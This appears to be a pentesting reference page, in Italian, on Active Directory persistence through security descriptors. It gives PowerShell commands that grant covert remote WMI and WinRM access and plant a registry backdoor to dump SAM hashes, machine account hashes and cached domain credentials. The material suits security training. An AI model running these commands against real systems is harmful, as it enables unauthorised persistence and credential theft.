# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Il Security Descriptor Definition Language (SDDL) definisce il formato utilizzato per descrivere un security descriptor. SDDL utilizza stringhe ACE per DACL e SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

I **security descriptors** vengono utilizzati per **memorizzare** i **permessi** che un **oggetto** ha **su** un **oggetto**. Se puoi semplicemente **fare** un **piccolo cambiamento** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover essere membro di un gruppo privilegiato.

Quindi, questa tecnica di persistenza si basa sulla capacità di ottenere ogni privilegio necessario su determinati oggetti, per poter eseguire un'attività che di solito richiede privilegi di amministratore ma senza la necessità di essere admin.

### Access to WMI

Puoi dare a un utente accesso per **eseguire WMI remotamente** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Accesso a WinRM

Dai accesso alla **console PS di winrm a un utente** [**utilizzando questo**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Accesso remoto agli hash

Accedi al **registro** e **dumpa gli hash** creando un **backdoor nel registro usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** così puoi in qualsiasi momento recuperare l'**hash del computer**, il **SAM** e qualsiasi **credential AD** memorizzata nella cache nel computer. Quindi, è molto utile concedere questo permesso a un **utente normale contro un computer Domain Controller**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Controlla [**Silver Tickets**](silver-ticket.md) per scoprire come potresti utilizzare l'hash dell'account del computer di un Domain Controller.

{{#include ../../banners/hacktricks-training.md}}
